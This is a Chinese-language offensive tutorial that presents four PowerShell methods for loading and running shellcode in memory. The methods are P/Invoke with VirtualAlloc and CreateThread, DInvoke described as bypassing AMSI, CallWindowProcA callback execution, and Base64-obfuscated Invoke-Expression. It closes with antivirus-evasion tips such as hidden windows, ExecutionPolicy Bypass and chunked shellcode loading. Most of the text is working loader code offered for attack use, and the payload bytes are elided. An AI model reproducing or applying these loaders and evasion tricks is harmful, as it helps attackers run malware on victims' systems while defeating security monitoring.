# 06 - PowerShell Shellcode加载（4种方法）

## 方法1：Add-Type + P/Invoke（基础）
```powershell
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr t);
"@
$api = Add-Type -MemberDefinition $code -Name "Win32" -Namespace Win32 -PassThru
[Byte[]] $buf = 0xfc,0x48,0x83,...
$addr = $api::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$api::CreateThread(0, 0, $addr, 0, 0, 0)
```

## 方法2：DInvoke（绕过AMSI监控）
```powershell
# 手动获取函数指针，避免P/Invoke被Hook
$hKernel32 = [DInvoke.Native]::LoadLibrary("kernel32.dll")
$pVirtualAlloc = [DInvoke.Native]::GetProcAddress($hKernel32, "VirtualAlloc")
$addr = [DInvoke.DynamicInvoke]::Invoke($pVirtualAlloc, @($null, $buf.Length, 0x3000, 0x40))
# ...写入shellcode，回调执行
```

## 方法3：CallWindowProcA（回调执行，无新线程）
```powershell
$code = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
[DllImport("user32.dll")]  public static extern IntPtr CallWindowProcA(IntPtr f, IntPtr h, uint m, IntPtr w, IntPtr l);
"@
# ...VirtualAlloc → Copy → CallWindowProcA执行shellcode
# 无CreateThread/NtCreateThreadEx调用
```

## 方法4：PowerShell混淆（Invoke-Obfuscation）
```powershell
# 多层编码：Base64 → XOR → Gzip压缩 → 字符串分割
$c = "JABjAG8AZABlACAAPQAgAEAAIg[...base64...]"
$d = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($c))
Invoke-Expression $d
```

### PowerShell免杀增强
- 用 `-WindowStyle Hidden -NoLogo -NonInteractive -ExecutionPolicy Bypass` 启动
- 避免 `Invoke-Expression`，用 `&` 调用
- 避免 `DownloadString`，用 `Net.WebClient` + 自定义 User-Agent
- 分块加载shellcode，分散内存分配时间
